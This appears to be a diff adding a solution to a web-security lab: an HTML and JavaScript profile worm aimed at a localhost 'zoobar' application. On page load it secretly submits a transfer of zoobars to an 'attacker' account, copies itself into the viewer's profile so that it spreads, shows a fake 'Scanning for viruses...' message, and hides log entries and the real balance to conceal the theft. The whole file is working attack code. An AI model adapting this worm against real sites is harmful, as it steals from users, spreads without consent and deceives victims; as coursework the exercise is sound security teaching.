@@ -1,0 +1,41 @@
+<div id="attacker">
+<iframe id="frame1" name="frame1" src="" style="display:none"></iframe>
+<iframe id="frame2" name="frame2" src="" style="display:none"></iframe>
+<form method="POST" name="transferform" id="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" style="display:none" target="frame1">
+<p>Send <input name='zoobars_display' type='text' value="" size=5> zoobars</p>
+<p>to <input name=recipient_display type=text value="" size=10></p>
+<input name="zoobars" type="text" value="1" size=5 style="display:none">
+<input name=recipient type=text value="attacker" size=10 style="display:none">
+<input type="submit" name="submission" value="Send">
+</form>
+
+<form method="POST" name="profileform" id="profileform" action="http://localhost:8080/zoobar/index.cgi/" style="display:none" target="frame2">
+    <textarea id="profile_update" name="profile_update" rows="20" cols="80"></textarea>
+    <br />
+    <input type="submit" name="profile_submit" value="Save" />
+</form>
+
+<script type="text/javascript">
+    function makeProfile() {
+	var sentence = document.createElement("b");
+	sentence.appendChild(document.createTextNode("Scanning for viruses..."));
+	document.getElementById('profile').appendChild(sentence);
+    }
+
+    function spreadProfile() {
+    	var attacker_profile = document.getElementById('attacker');
+	document.getElementById('profile_update').value = '<div id='+'attacker'+'>' + attacker_profile.innerHTML + '</div>';
+    	document.getElementById('profileform').submit();
+    }
+
+    document.addEventListener("DOMContentLoaded", function(event) {
+	spreadProfile();
+	document.getElementById('transferform').submit();	// transfer zoobars
+    	makeProfile();	// fake profile
+	document.getElementsByClassName('log')[0].tBodies[0].setAttribute("style","display:none");	// hide log entries
+	document.getElementById('zoobars').className = 10;	// hide zoobars
+	total = 10;
+	showZoobars(0);
+    });
+</script>
+</div>
